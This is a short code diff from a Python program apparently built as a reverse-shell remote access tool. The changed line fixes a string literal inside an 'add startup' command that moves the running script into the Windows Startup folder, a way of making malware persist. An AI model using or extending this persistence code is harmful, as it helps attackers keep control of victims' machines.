@@ -337,7 +337,7 @@ def reverseShell():
                 # Startup Command
                 elif command.lower() == 'add startup':
                     user = getuser()
-                    startupPath = f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+                    startupPath = rf'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
                     copyStartup = f'move /Y "{__file__}" "{startupPath}"'
                     print(copyStartup)
                     os.popen(copyStartup)
